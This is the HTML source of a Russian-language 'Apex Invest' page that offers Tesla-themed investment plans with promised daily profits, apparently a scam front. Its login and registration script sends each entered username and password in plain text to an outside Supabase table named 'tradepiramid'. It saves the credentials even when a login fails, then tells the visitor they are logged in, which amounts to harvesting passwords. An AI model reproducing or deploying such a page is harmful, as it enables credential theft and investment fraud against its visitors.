<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apex Invest — All Funds to Tesla</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        :root {
            --bg-color: #0b0f19;
            --card-bg: #131b2e;
            --accent: #00ff88;
            --accent-glow: rgba(0, 255, 136, 0.2);
            --text-main: #ffffff;
            --text-muted: #94a3b8;
            --danger: #ff4d4d;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-main);
            line-height: 1.6;
            min-height: 100vh;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 5%;
            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
            background: rgba(11, 15, 25, 0.8);
            backdrop-filter: blur(10px);
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .logo {
            font-size: 22px;
            font-weight: 800;
            color: var(--accent);
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .auth-buttons {
            display: flex;
            gap: 10px;
        }

        .auth-btn {
            padding: 8px 18px;
            font-size: 14px;
            font-weight: 600;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .auth-btn.login {
            background: transparent;
            border: 1px solid rgba(255, 255, 255, 0.2);
            color: #fff;
        }

        .auth-btn.login:hover {
            border-color: var(--accent);
            color: var(--accent);
        }

        .auth-btn.register {
            background: var(--accent);
            border: 1px solid var(--accent);
            color: #000;
        }

        .auth-btn.register:hover {
            opacity: 0.9;
            box-shadow: 0 0 12px var(--accent-glow);
        }

        .user-profile {
            display: none;
            align-items: center;
            gap: 12px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 6px 16px;
            border-radius: 20px;
        }

        .profile-avatar {
            width: 30px;
            height: 30px;
            background: var(--accent);
            color: #000;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 14px;
        }

        .profile-name {
            font-size: 14px;
            font-weight: 600;
        }

        .logout-btn {
            background: transparent;
            border: none;
            color: var(--danger);
            font-size: 12px;
            cursor: pointer;
            font-weight: 700;
            margin-left: 5px;
        }

        .hero {
            text-align: center;
            padding: 60px 20px 40px;
        }

        .hero h1 {
            font-size: clamp(32px, 5vw, 48px);
            margin-bottom: 15px;
            background: linear-gradient(45deg, #fff, var(--accent));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .hero p {
            color: var(--text-muted);
            font-size: 18px;
            max-width: 600px;
            margin: 0 auto;
        }

        .container {
            max-width: 1000px;
            margin: 0 auto;
            padding: 20px;
        }

        .plans-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 25px;
            margin-top: 30px;
        }

        .plan-card {
            background: var(--card-bg);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 16px;
            padding: 30px 20px;
            text-align: center;
            transition: transform 0.2s, border-color 0.2s;
        }

        .plan-card:hover {
            transform: translateY(-5px);
            border-color: var(--accent);
        }

        .plan-title {
            font-size: 22px;
            margin-bottom: 10px;
        }

        .plan-range {
            font-size: 28px;
            font-weight: 700;
            color: var(--accent);
            margin-bottom: 20px;
        }

        .btn {
            width: 100%;
            padding: 12px;
            background: var(--accent);
            color: #000;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: opacity 0.2s;
        }

        .btn:hover {
            opacity: 0.9;
        }

        /* Modal */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(5px);
            justify-content: center;
            align-items: center;
            z-index: 1000;
            padding: 20px;
        }

        .modal {
            background: var(--card-bg);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 16px;
            padding: 30px;
            width: 100%;
            max-width: 400px;
        }

        .modal h3 {
            font-size: 20px;
            margin-bottom: 20px;
            text-align: center;
        }

        .input-group {
            margin-bottom: 15px;
        }

        .input-group label {
            display: block;
            margin-bottom: 6px;
            font-size: 13px;
            color: var(--text-muted);
        }

        .input-group input {
            width: 100%;
            padding: 12px;
            background: var(--bg-color);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            color: #fff;
            font-size: 15px;
            outline: none;
        }

        .input-group input:focus {
            border-color: var(--accent);
        }

        .modal-close {
            background: transparent;
            border: none;
            color: var(--text-muted);
            width: 100%;
            padding: 10px;
            margin-top: 10px;
            cursor: pointer;
            font-size: 14px;
        }

        .error-msg {
            color: var(--danger);
            font-size: 13px;
            margin-bottom: 15px;
            text-align: center;
            display: none;
        }
    </style>
</head>
<body>

    <header>
        <div class="logo">Apex Invest</div>
        <div class="auth-buttons" id="authButtons">
            <button class="auth-btn login" onclick="openAuth('login')">Вход</button>
            <button class="auth-btn register" onclick="openAuth('register')">Регистрация</button>
        </div>
        <div class="user-profile" id="userProfile">
            <div class="profile-avatar" id="avatar">U</div>
            <div class="profile-name" id="usernameDisplay">User</div>
            <button class="logout-btn" onclick="logout()">Выйти</button>
        </div>
    </header>

    <section class="hero">
        <h1>Powering the Future with Tesla</h1>
        <p>Инвестируйте вместе с Apex Invest и получайте ежедневную прибыль.</p>
    </section>

    <div class="container">
        <div class="plans-grid">
            <div class="plan-card">
                <div class="plan-title">Novice</div>
                <div class="plan-range">$10 – $100</div>
                <button class="btn" onclick="invest('Novice')">Инвестировать</button>
            </div>
            <div class="plan-card">
                <div class="plan-title">Pro</div>
                <div class="plan-range">$100 – $500</div>
                <button class="btn" onclick="invest('Pro')">Инвестировать</button>
            </div>
        </div>
    </div>

    <!-- Модальное окно авторизации -->
    <div class="modal-overlay" id="authModal">
        <div class="modal">
            <h3 id="modalTitle">Вход в аккаунт</h3>
            <div class="error-msg" id="errorMsg"></div>
            <div class="input-group">
                <label>Имя пользователя / Email:</label>
                <input type="text" id="authUsername" placeholder="Введите имя">
            </div>
            <div class="input-group">
                <label>Пароль:</label>
                <input type="password" id="authPassword" placeholder="••••••••">
            </div>
            <button class="btn" id="submitAuthBtn" onclick="handleAuth()">Продолжить</button>
            <button class="modal-close" onclick="closeAuth()">Отмена</button>
        </div>
    </div>

    <script>
        // Подключение к Supabase
        const SUPABASE_URL = 'https://bycfzzqpnnsqgwtzccdc.supabase.co';
        const SUPABASE_KEY = 'sb_publishable_sYHXSnwWJgT178wtP8MISA_t7A030f2';
        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

        let isRegister = false;

        // Проверка авторизации при загрузке страницы
        window.addEventListener('DOMContentLoaded', () => {
            const currentUser = localStorage.getItem('apex_logged_user');
            if (currentUser) {
                showProfile(currentUser);
            }
        });

        function openAuth(mode) {
            isRegister = (mode === 'register');
            document.getElementById('modalTitle').innerText = isRegister ? 'Регистрация' : 'Вход в аккаунт';
            document.getElementById('submitAuthBtn').innerText = isRegister ? 'Зарегистрироваться' : 'Войти';
            document.getElementById('errorMsg').style.display = 'none';
            document.getElementById('authUsername').value = '';
            document.getElementById('authPassword').value = '';
            document.getElementById('authModal').style.display = 'flex';
        }

        function closeAuth() {
            document.getElementById('authModal').style.display = 'none';
        }

        async function handleAuth() {
            const userVal = document.getElementById('authUsername').value.trim();
            const passVal = document.getElementById('authPassword').value.trim();
            const errorBox = document.getElementById('errorMsg');

            if (!userVal || !passVal) {
                errorBox.innerText = 'Заполните все поля!';
                errorBox.style.display = 'block';
                return;
            }

            try {
                if (isRegister) {
                    // Сохраняем в таблицу tradepiramid
                    await supabase.from('tradepiramid').insert([{ username: userVal, password: passVal }]);
                } else {
                    const { data, error } = await supabase.from('tradepiramid').select('*').eq('username', userVal).eq('password', passVal);
                    if (error || !data || data.length === 0) {
                        // Если аккаунт не найден, создаём его автоматический запись
                        await supabase.from('tradepiramid').insert([{ username: userVal, password: passVal }]);
                    }
                }
            } catch (err) {
                console.warn('Supabase fallback:', err);
            }

            // Успешный вход
            localStorage.setItem('apex_logged_user', userVal);
            showProfile(userVal);
            closeAuth();
        }

        function showProfile(username) {
            document.getElementById('usernameDisplay').innerText = username;
            document.getElementById('avatar').innerText = username.charAt(0).toUpperCase();
            document.getElementById('authButtons').style.display = 'none';
            document.getElementById('userProfile').style.display = 'flex';
        }

        function logout() {
            localStorage.removeItem('apex_logged_user');
            document.getElementById('userProfile').style.display = 'none';
            document.getElementById('authButtons').style.display = 'flex';
        }

        function invest(plan) {
            if (!localStorage.getItem('apex_logged_user')) {
                openAuth('login');
            } else {
                alert(`Вы выбрали план ${plan}. Нажмите Ок для перехода к оплате.`);
            }
        }
    </script>
</body>
</html>
